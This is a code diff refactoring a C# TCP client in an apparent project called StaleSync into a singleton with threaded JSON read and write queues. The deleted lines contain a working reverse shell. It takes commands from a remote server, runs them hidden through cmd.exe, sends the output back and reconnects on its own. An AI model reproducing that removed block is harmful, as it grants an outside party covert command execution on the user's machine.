@@ -1,58 +1,104 @@
-using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
-using System;
+using System.Collections.Generic;
 using System.Threading;
-using Cfg = StaleSync.Proto.ConfigFile<StaleSync.Core.Config>;
+using StaleSync.Proto;
+using static StaleSync.Proto.CollTool;
+
+// ReSharper disable InconsistentNaming
 
 namespace StaleSync.Core
 {
-    public static class Client
+    public sealed class Client
     {
-        public static void Start(string serverIP, int port, int delay)
+        public static Client Instance { get; } = new();
+
+        private Config _config;
+
+        private readonly Queue<Message> _readQueue;
+        private Thread _readThread;
+
+        private readonly Queue<Message> _writeQueue;
+        private Thread _writeThread;
+
+        private Client()
         {
-            while (true)
+            _readQueue = new Queue<Message>();
+            _writeQueue = new Queue<Message>();
+        }
+
+        public bool ShouldRun { get; set; }
+
+        public void Connect(Config config)
+        {
+            _config = config;
+            ShouldRun = true;
+            _readThread = new Thread(ReadLoop) { IsBackground = true, Name = "ClientRead" };
+            _readThread.Start();
+            _writeThread = new Thread(WriteLoop) { IsBackground = true, Name = "ClientWrite" };
+            _writeThread.Start();
+        }
+
+        private void ReadLoop()
+        {
+            var serverIP = _config.HostIP;
+            var readPort = _config.HostRead;
+            var delay = _config.Reconnect;
+
+            while (ShouldRun)
             {
                 try
                 {
-                    Console.WriteLine("Attempting to connect...");
-                    using var client = new TcpClient(serverIP, port);
-                    using var stream = client.GetStream();
-                    using var reader = new StreamReader(stream);
-                    using var writer = new StreamWriter(stream);
-                    writer.AutoFlush = true;
-                    Console.WriteLine("Connected to server!");
+                    using var readClient = new TcpClient(serverIP, readPort);
+                    using var readStream = readClient.GetStream();
+                    using var reader = new StreamReader(readStream);
 
-                    string command;
-                    while ((command = reader.ReadLine()) != null)
+                    while (ShouldRun && ReadLineTrim(reader) is { } line)
                     {
-                        var process = new Process();
-                        process.StartInfo.FileName = "cmd.exe";
-                        process.StartInfo.Arguments = "/c " + command;
-                        process.StartInfo.RedirectStandardOutput = true;
-                        process.StartInfo.RedirectStandardError = true;
-                        process.StartInfo.UseShellExecute = false;
-                        process.StartInfo.CreateNoWindow = true;
-                        process.Start();
-
-                        var output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
-                        writer.WriteLine(output);
+                        var msg = JsonTool.FromJson<Message>(line);
+                        _readQueue.Enqueue(msg);
                     }
                 }
-                catch (Exception ex)
+                catch (SocketException)
                 {
-                    Console.WriteLine("Connection lost: " + ex.Message);
-                    Console.WriteLine($"Reconnecting in {delay / 1000} seconds...");
                     Thread.Sleep(delay);
                 }
             }
+            _readQueue.Clear();
         }
 
-        public static void Run()
+        private void WriteLoop()
         {
-            Cfg.Load();
-            var cfg = Cfg.Config;
-            Start(cfg.HostIP, cfg.HostPort, cfg.Reconnect);
+            var serverIP = _config.HostIP;
+            var writePort = _config.HostWrite;
+            var delay = _config.Reconnect;
+
+            while (ShouldRun)
+            {
+                try
+                {
+                    using var writeClient = new TcpClient(serverIP, writePort);
+                    using var writeStream = writeClient.GetStream();
+                    using var writer = new StreamWriter(writeStream);
+
+                    while (ShouldRun && TryDequeue(_writeQueue) is { } msg)
+                    {
+                        var json = JsonTool.ToJson(msg);
+                        writer.WriteLine(json);
+                        writer.Flush();
+                    }
+                }
+                catch (SocketException)
+                {
+                    Thread.Sleep(delay);
+                }
+            }
+            _writeQueue.Clear();
+        }
+
+        public void Disconnect()
+        {
+            ShouldRun = false;
         }
     }
 }
